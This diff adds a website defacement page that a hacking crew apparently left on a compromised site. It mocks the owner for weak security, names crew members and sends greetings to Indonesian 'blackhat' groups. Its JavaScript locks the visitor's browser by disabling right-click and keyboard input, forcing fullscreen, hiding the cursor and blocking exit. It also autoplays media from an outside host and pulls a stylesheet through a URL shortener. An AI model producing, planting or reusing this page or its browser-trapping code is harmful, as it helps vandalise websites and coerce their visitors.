@@ -1,0 +1,39 @@
+<html>
+<head>
+<title>Wh00ps! - Stoupid!</title>
+	<meta name='theme-color' content='black'>
+	<meta name="author" content="I am about fucking!">
+	<meta name="copyright" content="2020">
+	<meta name="description" content="I am about fucking!">
+	<meta name="keywords" content="Hacker Ganteng Wass Here!">
+
+	 <link rel = "icon" href = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPJDT50tDK4zwO-b8Tq-_9MzerIP8AfBocBA&usqp=CAU"> 
+	<table width=100% height=100%>
+	<td align="center">
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script><style type="text/css">a:hover,body{cursor:url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important}</style><link rel="stylesheet" href="https://bit.ly/2UGCIC5"></head><body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick='document.getElementById("lagu").play(),fs()' id="body" onload="typeWriter()"><style type="text/css">center{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}</style><script language="JavaScript">function confirmExit(){return"are you sure ? wkwk"}function fs(){var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="none",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){var n=["Wh00pz ! your security get down !","Patch it now ! before got hacked again !","Don't worry, your files are safe.","Remember ! We are party at your security !"];!function e(t){void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)})</script><audio src="https://kodesumber.my.id/1.mp3" autoplay="true" id="lagu" loop=""></audio><video id="background-video" src="https://kodesumber.my.id/ea.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="https://kodesumber.my.id/ea.mp4" type="video/webm"></video>
+</head>
+<body bgcolor='black'>
+<center> 
+	<img src="https://i.gifer.com/origin/b2/b2557bc3736f26ae744d4a13add74949_w200.gif" width="400">
+        <br><br><font color="white" face="courier new" size="5">Wh00ps! - Stoupid!</font>
+      <br><center>
+<center><img src="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-yaTAF.gif">
+<br>
+<h3><font face="courier new" color="white"> - Iam About Fucking!. -
+<br>
+<br>
+| <font color="red"> - Stoupid! - </font>Atengg377 - Wh00ps! Stoupid! - Mc'Sl0vv - ZakSec166 - Ardav - FellGanss - |
+<br>
+<br><right><font size='5' color="white">Gretz:</font>
+</font></h3></b>
+<marquee color="white" behavior="alternate" scrollamount="6" width="70%" style="width: 70%;"><font color="white"></font><font color="white"></font> | Jakarta Cyber Team - Blackhat Hacker Indonesia - Jakarta Blackhat - Idiot Blackhat | SenpaiXCrew| </marquee>
+  <br>  </font>
+<br>
+<br>
+<br>
+  
+
+
+
+ </body></html>
